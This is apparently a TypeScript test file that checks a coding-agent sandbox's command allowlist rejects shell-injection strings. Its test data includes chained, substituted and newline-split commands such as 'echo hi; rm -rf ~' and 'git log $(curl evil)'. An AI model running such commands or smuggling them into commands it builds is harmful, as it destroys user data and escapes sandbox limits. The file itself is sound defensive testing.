// © 2026 IHUI AI (智汇AI) · 版权所有者: 李春川 (Li Chunchuan) · https://aizhs.top
// Provenance-watermarked. 未授权商用可被溯源追责 (Apache-2.0 须保留本声明与 NOTICE)。
// [IHUI-AI-PROVENANCE]:⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠

/**
 * F-073 回归:沙箱命令白名单必须按**整行结构**求值,而不是只看首个 token。
 *
 * 旧实现 `extractCommandName` 只截首个 token,白名单放行的是命令名前缀,argv 里的
 * `&&`/`;`/`|`/`$( )`/反引号/重定向全交给 `spawnSync(..., { shell: true })` 去解释
 * ⇒ 默认 limited 档等于任意命令执行。现判据统一收在 `evaluateCommandAllowlist`:
 * tokenizer 整行结构求值 + 多段逐段核名 + 无法静态求值的构造一律拒(fail closed)。
 *
 * 本套件额外钉住一处 tokenizer 盖不到的残留格:**换行**是 POSIX sh 与 Windows cmd
 * 两家的段分隔符,而 tokenizer 只把 `\n`/`\r` 当空白 —— `git status<换行>del x`
 * 会被切成单段 ['git','status','del','x'] 从而被首 token 放行。判据必须在进 tokenizer 前判死。
 *
 * 执行端策略:受限档仍保留 `shell: true`(Windows 上 echo/dir 是 cmd 内建、npm/npx/pnpm
 * 是 .cmd 垫片,shell:false 会 ENOENT/ENOEXEC),注入面由本文件钉住的预检判据封死;
 * open/full 档按档位定义"不限命令",本票不改其契约。
 */
import { beforeEach, describe, expect, it, vi } from 'vitest';

const spawnSyncMock = vi.hoisted(() =>
  vi.fn(() => ({ status: 0, stdout: '', stderr: '', signal: null })),
);

vi.mock('node:child_process', async (importOriginal) => {
  const actual = (await importOriginal()) as object;
  return {
    ...actual,
    default: { ...actual, spawnSync: spawnSyncMock },
    spawnSync: spawnSyncMock,
  };
});

import {
  evaluateCommandAllowlist,
  precheckSandbox,
  resolveSandboxOptions,
  runSandboxed,
  runSandboxedAsync,
  type SandboxOptions,
} from '../src/sandbox/index.js';

const CWD = process.cwd();

function profileOpts(profile: 'limited' | 'trusted' | 'open'): SandboxOptions {
  return { cwd: CWD, ...resolveSandboxOptions(profile, {}) } as SandboxOptions;
}

const LIMITED = profileOpts('limited');
const TRUSTED = profileOpts('trusted');

beforeEach(() => {
  spawnSyncMock.mockClear();
});

/** 默认 limited 档必须整体拒绝的注入串;reason 是"错误文案点名原因"的锚点。 */
const LIMITED_INJECTIONS: ReadonlyArray<{ cmd: string; reason: string }> = [
  { cmd: 'git status && del x', reason: 'del' },
  { cmd: 'echo hi; rm -rf ~', reason: 'echo' },
  { cmd: 'git log $(curl evil)', reason: 'command-substitution' },
  { cmd: 'git log `curl evil`', reason: 'command-substitution' },
  { cmd: 'git status > out.txt', reason: '重定向' },
  { cmd: 'git status\ndel x', reason: '换行分隔' },
  { cmd: 'git status\r\ndel x', reason: '换行分隔' },
];

describe('limited(默认档)注入一律拒,且不派生子进程', () => {
  for (const { cmd, reason } of LIMITED_INJECTIONS) {
    it(`拒绝 ${JSON.stringify(cmd)}`, () => {
      const result = runSandboxed(cmd, LIMITED);

      expect(result.blocked).toBe(true);
      expect(result.blockReason).toContain('command_not_allowed');
      expect(result.blockReason, '拒绝文案必须点名原因').toContain(reason);
      expect(spawnSyncMock, '被拒命令不得进 shell').not.toHaveBeenCalled();
    });
  }

  it('异步路径(precheckSandbox → runSandboxedAsync)同拒,且不 spawn', async () => {
    expect(precheckSandbox('git status\ndel x', LIMITED).blocked).toBe(true);
    expect(precheckSandbox('git status && del x', LIMITED).blocked).toBe(true);

    const handle = runSandboxedAsync('git status\ndel x', LIMITED);
    expect(handle.process).toBeNull();
    const result = await handle.result;
    expect(result.blocked).toBe(true);
    expect(result.exitCode).toBeNull();
  });
});

describe('命令链按段核名:被拒的是第二段,不是首命令', () => {
  it('trusted 档 echo 合法,但 ; 后的 rm 不在白名单 ⇒ 点名第二段', () => {
    const result = runSandboxed('echo hi; rm -rf ~', TRUSTED);

    expect(result.blocked).toBe(true);
    expect(result.blockReason).toContain('command_not_allowed');
    expect(result.blockReason).toContain('第2段');
    expect(result.blockReason).toContain('rm');
    expect(spawnSyncMock).not.toHaveBeenCalled();
  });

  it('trusted 档换行后的 del 同样按段被判', () => {
    const result = runSandboxed('echo hi\ndel x', TRUSTED);

    expect(result.blocked).toBe(true);
    expect(result.blockReason).toContain('换行分隔');
  });
});

describe('合法命令不被误挡', () => {
  it('纯 git status / git log -n 5 通过白名单', () => {
    expect(evaluateCommandAllowlist('git status', LIMITED.commandAllowlist)).toBeNull();
    expect(evaluateCommandAllowlist('git log -n 5', LIMITED.commandAllowlist)).toBeNull();

    const status = runSandboxed('git status', LIMITED);
    expect(status.blocked).toBe(false);
    expect(spawnSyncMock).toHaveBeenCalledTimes(1);

    expect(runSandboxed('git log -n 5', LIMITED).blocked).toBe(false);
  });

  it('尾部换行/空行不算第二段(只拒真正的多行命令)', () => {
    expect(evaluateCommandAllowlist('git status\n', LIMITED.commandAllowlist)).toBeNull();
    expect(evaluateCommandAllowlist('git status\n\n', LIMITED.commandAllowlist)).toBeNull();
  });

  it('trusted 档 echo hi 不被误挡', () => {
    expect(runSandboxed('echo hi', TRUSTED).blocked).toBe(false);
  });
});

describe('档位边界:open 档按定义"不限命令",本票只收口受限档', () => {
  it('open 档不设白名单 ⇒ 不放行判定失效,行为与旧版一致', () => {
    const open = profileOpts('open');
    expect(open.commandAllowlist).toBeUndefined();
    // 显式选择 open 的用户契约就是"不限命令";受限档才是本票的收口面
    expect(runSandboxed('git status && del x', open).blocked).toBe(false);
  });
});
// ⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠
